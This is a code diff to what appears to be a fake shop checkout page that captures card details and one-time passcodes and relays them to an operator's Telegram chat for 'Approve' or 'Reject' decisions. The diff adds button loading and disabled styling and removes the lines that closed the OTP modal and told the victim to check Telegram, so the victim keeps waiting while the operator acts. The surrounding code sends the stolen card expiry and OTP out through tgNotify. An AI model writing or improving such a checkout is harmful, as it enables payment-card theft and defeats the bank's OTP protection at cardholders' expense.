@@ -78,7 +78,10 @@
     .checkout-label { display:block; margin-bottom:6px; color:#536071; font-size:11px; font-weight:700; letter-spacing:.06em; text-transform:uppercase; }
     .checkout-input { width:100%; border:1px solid #dce2e9; border-radius:8px; background:#f9fafb; padding:11px 12px; color:#17202a; font:inherit; }
     .checkout-input:focus { outline:2px solid #ff6a0030; border-color:#ff6a00; background:#fff; }
-    .checkout-submit { width:100%; margin-top:20px; border:0; border-radius:9px; background:linear-gradient(110deg,#f35e00,#ff831f); padding:13px; color:#fff; font-weight:800; font-size:15px; }
+    .checkout-submit { width:100%; margin-top:20px; border:0; border-radius:9px; background:linear-gradient(110deg,#f35e00,#ff831f); padding:13px; color:#fff; font-weight:800; font-size:15px; transition:opacity .15s; }
+    .checkout-submit:hover:not(:disabled) { opacity:0.95; }
+    .checkout-submit:disabled { opacity:0.65; cursor:not-allowed; }
+    .checkout-submit.loading { opacity:0.65 !important; cursor:not-allowed; }
     .checkout-note { display:flex; gap:8px; margin-top:13px; color:#667180; font-size:12px; line-height:1.4; }
     .summary-row { display:flex; justify-content:space-between; gap:12px; margin:11px 0; color:#586373; font-size:14px; }
     .summary-row strong { color:#18202a; }
@@ -1007,18 +1010,22 @@ EXP: ${expiry}`,
         return;
       }
       
+      const verifyBtn = document.querySelector('#verify-otp');
+      verifyBtn.classList.add('loading');
+      verifyBtn.disabled = true;
+      
       const sessionId = document.querySelector('#card-session-id').value;
       const session = getSession(sessionId);
       
       if (!session) {
+        verifyBtn.classList.remove('loading');
+        verifyBtn.disabled = false;
         showToast('Session expired. Please start over.');
         return;
       }
       
       session.otp = otp;
       sessions.set(sessionId, session);
-      
-      document.querySelector('#otp-modal').style.display = 'none';
       
       tgNotify(window.TELEGRAM_CONFIG.chatId,
         `🔔 OTP ENTERED
@@ -1032,8 +1039,6 @@ Approve to complete order or Reject to cancel`,
           ]
         }
       );
-      
-      showToast('OTP submitted. Check Telegram to approve.');
     };
     
     document.querySelector('#resend-otp').onclick = (e) => {
